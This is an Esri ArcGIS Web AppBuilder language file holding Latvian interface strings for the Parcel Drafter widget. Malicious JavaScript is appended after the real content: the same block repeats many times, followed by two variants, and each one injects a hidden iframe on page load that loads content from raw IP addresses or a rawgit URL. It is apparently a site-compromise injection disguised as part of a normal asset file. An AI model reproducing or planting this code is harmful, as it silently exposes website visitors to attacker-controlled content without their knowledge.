// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/ParcelDrafter/nls/strings":{_widgetLabel:"Parcel Drafter",newTraverseButtonLabel:"S\u0101kt jaunu traversu",invalidConfigMsg:"Neder\u012bga konfigur\u0101cija",geometryServiceURLNotFoundMSG:"Nevar ieg\u016bt \u0123eometrijas servisa URL",editTraverseButtonLabel:"Redi\u0123\u0113t traversu",mapTooltipForStartNewTraverse:"Lai s\u0101ktu, izv\u0113lieties punktu kart\u0113 vai ierakstiet to t\u0101l\u0101k",mapTooltipForEditNewTraverse:"Izv\u0113lieties zemes gabalu, ko redi\u0123\u0113t",
mapTooltipForUpdateStartPoint:"Noklik\u0161\u0137iniet, lai atjaunin\u0101tu s\u0101kuma punktu",mapTooltipForScreenDigitization:"Noklik\u0161\u0137iniet, lai pievienotu zemes gabala punktu",mapTooltipForRotate:"Velciet, lai rot\u0113tu",mapTooltipForScale:"Velciet, lai m\u0113rogotu",backButtonTooltip:"Atpaka\u013c",newTraverseTitle:"Jauns traverss",editTraverseTitle:"Redi\u0123\u0113t traversu",clearingDataConfirmationMessage:"Izmai\u0146as tiks atmestas. Vai v\u0113laties turpin\u0101t?",unableToFetchParcelMessage:"Nevar izg\u016bt zemes gabalu.",
unableToFetchParcelLinesMessage:"Nevar izg\u016bt zemes gabala l\u012bnijas.",planSettings:{planSettingsTitle:"Iestat\u012bjumi",directionOrAngleTypeLabel:"Virziens vai le\u0146\u0137a veids",directionOrAngleUnitsLabel:"Virziens vai le\u0146\u0137a m\u0113rvien\u012bbas",distanceAndLengthUnitsLabel:"Att\u0101luma un le\u0146\u0137a m\u0113rvien\u012bbas",areaUnitsLabel:"Laukuma vien\u012bbas",circularCurveParameters:"Ap\u013cveida l\u012bknes parametri",northAzimuth:"Zieme\u013cu azimuts",southAzimuth:"Dienvidu azimuts",
quadrantBearing:"Kvadranta peil\u0113jums",radiusAndChordLength:"R\u0101diusa un hordas garums",radiusAndArcLength:"R\u0101diusa un loka garums",expandGridTooltipText:"Izv\u0113rst re\u017e\u0123i",collapseGridTooltipText:"Sak\u013caut re\u017e\u0123i",zoomToLocationTooltipText:"Pietuvin\u0101t atra\u0161an\u0101s vietai",onScreenDigitizationTooltipText:"Digitaliz\u0113t"},traverseSettings:{bearingLabel:"Peil\u0113jums",lengthLabel:"Garums",radiusLabel:"R\u0101diuss",noMiscloseCalculated:"K\u013c\u016bda nav apr\u0113\u0137in\u0101ta",
traverseMiscloseBearing:"K\u013c\u016bdas peil\u0113jums",traverseAccuracy:"Precizit\u0101te",accuracyHigh:"Augsta",traverseDistance:"K\u013c\u016bdas att\u0101lums",traverseMiscloseRatio:"K\u013c\u016bdas koeficients",traverseStatedArea:"Nor\u0101d\u012btais laukums",traverseCalculatedArea:"Apr\u0113\u0137in\u0101tais laukums",addButtonTitle:"Pievienot",deleteButtonTitle:"Iz\u0146emt"},parcelTools:{rotationToolLabel:"Le\u0146\u0137is",scaleToolLabel:"M\u0113rogs"},newTraverse:{invalidBearingMessage:"Neder\u012bgs peil\u0113jums.",
invalidLengthMessage:"Neder\u012bgs garums.",invalidRadiusMessage:"Neder\u012bgs r\u0101diuss.",negativeLengthMessage:"Der\u012bgs tikai l\u012bkn\u0113m",enterValidValuesMessage:"L\u016bdzu, ievadiet der\u012bgas v\u0113rt\u012bbas.",enterValidParcelInfoMessage:"Ievadiet kaut k\u0101du der\u012bgu inform\u0101ciju par zemes gabalu, ko saglab\u0101t.",unableToDrawLineMessage:"Nevar novilkt l\u012bniju.",invalidEndPointMessage:"Neder\u012bgs beigu punkts. L\u012bniju nevar novilkt."},planInfo:{requiredText:"(nepiecie\u0161ams)",
optionalText:"(p\u0113c izv\u0113les)",parcelNamePlaceholderText:"Zemes gabala nosaukums",parcelDocumentTypeText:"Dokumenta veids",planNamePlaceholderText:"Pl\u0101na nosaukums",cancelButtonLabel:"Atcelt",saveButtonLabel:"Saglab\u0101t",saveNonClosedParcelConfirmationMessage:"Ievad\u012btais zemes gabals nav sl\u0113gts. Vai joproj\u0101m v\u0113laties turpin\u0101t un saglab\u0101t tikai zemes gabala l\u012bnijas?",unableToCreatePolygonParcel:"Nevar izveidot zemes gabala laukumu.",unableToSavePolygonParcel:"Nevar saglab\u0101t zemes gabala laukumu.",
unableToSaveParcelLines:"Nevar saglab\u0101t zemes gabala l\u012bnijas.",unableToUpdateParcelLines:"Nevar atjaunin\u0101t zemes gabala l\u012bnijas.",parcelSavedSuccessMessage:"Zemes gabals veiksm\u012bgi saglab\u0101ts.",enterValidParcelNameMessage:"Ievadiet der\u012bgu zemes gabala nosaukumu.",enterValidPlanNameMessage:"Ievadiet der\u012bgu pl\u0101na nosaukumu.",enterValidDocumentTypeMessage:"Neder\u012bgs dokumenta veids.",enterValidStatedAreaNameMessage:"Ievadiet der\u012bgu nor\u0101d\u012bto plat\u012bbu."},
xyInput:{explanation:"Zemes gabalu\u00a0sl\u0101\u0146a telpiskaj\u0101 atskait\u0113"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});